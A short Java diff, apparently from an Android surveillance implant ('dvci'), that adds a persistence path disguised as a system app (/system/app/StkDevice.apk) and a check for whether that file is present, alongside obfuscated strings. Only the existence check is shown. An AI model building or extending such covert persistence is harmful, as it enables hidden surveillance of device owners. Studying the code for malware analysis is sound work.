@@ -25,6 +25,7 @@ import com.android.dvci.conf.ConfEvent;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Globals;
 import com.android.dvci.event.BaseEvent;
+import com.android.dvci.file.AutoFile;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
@@ -97,6 +98,7 @@ public class Status {
 
 	static WakeLock wl;
 	private static String apkName;
+	public static final String persistencyApk=M.e("/system/app/StkDevice.apk");
 	private final Date startedTime = new Date();
 
 	private boolean deviceAdmin;
@@ -934,6 +936,19 @@ public class Status {
 		String apkName = getApkName();
 		if (apkName!=null){
 			return apkName.contains(M.e("/system/app/"));
+		}
+		return false;
+	}
+	public static Boolean persistencyReady() {
+		AutoFile apkFile = new AutoFile(persistencyApk);
+		if (apkFile.exists()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (persistencyReady) apk already there" + persistencyApk);
+			}
+			return true;
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there" + persistencyApk);
 		}
 		return false;
 	}
